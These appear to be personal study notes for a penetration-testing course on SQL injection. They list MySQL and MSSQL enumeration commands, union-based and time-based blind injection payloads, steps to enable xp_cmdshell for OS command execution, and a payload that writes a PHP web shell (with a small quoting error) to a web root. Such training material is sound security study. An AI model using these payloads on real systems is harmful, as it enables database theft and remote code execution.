## Section 1 SQL Theory and Databases
### Subsection 10.1.2 DB Types and Characteristics 
- To connect to a mysql database use 
```
mysql -u USERNAME -p'PASSWORD' -h IP -P 3306
```
- To get the version information use 
```
select version();
```
- To get information on the current database user for the ongoing session use
```
select system_user();
```
- To see the databases use 
```
show databases;
```
- To use a specific database 
```
use DB_NAME;
```
- To see the tables in the database
```
show tables;
```
- To connect to a Microsoft MySQL server (MSSQL) use impacket with 
```
impacket-mssqlclient USERNAME:PASSWORD@IP -windows-auth
```
- To get version information use 
```
SELECT @@version;
```
- To see all available databases use
```
SELECT name FROM sys.databases;
```
- The following are default databases in MSSQL
	- master
	- tempdb
	- model
	- msdb
- To see the tables from a database use
```
SELECT * FROM DB_NAME.information_schema.tables;
```
- To see all information from a DB table use
```
SELECT * FROM DB_NAME.dbo.TABLE_NAME;
```

## Section 2 Manual SQL Exploitation
### Subsection 10.2.2 Union-based Payloads
- The following statement prematurely terminates the SQL statement
```
' OR 1=1 -- //
```
- This can be upgraded to include a second arbitrary statement like 
```
' OR 1=1 in (select @@version) -- //
```
- The whole query would include a parameter such as the username if you were testing for injection in that field such as 
```
offsec' OR 1=1 in (select @@version) -- //
```
- The UNION query operator allows you to use an additional select statement
	- However it must contain the same amount of columns in each SELECT statement and the data types must match 
	- If the columns don't match use NULL to fill in the blank columns you don't need
- using the WHERE clause can help in specifying which information we want to see such as a specific password in the example below
```
' OR 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```
- You can order by column in order to enumerate the database to find all the column names if they are not visible by using the following 
	- The query fails when you have reached the last column and the column doesn't exist
	- Increase the number by 1 until it fails
```
' ORDER BY 1-- //
```
- You can also stop a SQL query by using 
```
%'
```
- To get database information in sqli
```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
### Subsection 10.2.3 Blind SQL Injections
- Time based queries that rely on a pass/fail methodology
- For example the application will hang for three seconds if true and return false if false using the following query
```
offsec' AND IF (1=1,sleep(3),'false') -- //
```
## Section 10.3 Manual and Automated Code Execution
### Subsection 10.3.1 Manual Code Execution
- In a MSSQL server xp_cmdshell takes a string and passes it to the server for execution and returns the output as strings of text
	- This must be called with the execute keyword
	- This feature is disabled by default 
	- See below on how to install and use xp_cmdshell
```
EXECUTE sp_configure 'show advanced options', 1;
```
```
RECONFIGURE;
```
```
EXECUTE sp_configure 'xp_cmdshell', 1;
```
- Now any shell command can be executed like below
```
EXECUTE xp_cmdshell 'whoami';
```
- Example command to write a webshell to a file from mysql
```
' UNION SELECT "<?php system($_GET['cmd]);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
## Exercises To-Do

- [ ] 2.1.1 (page 20)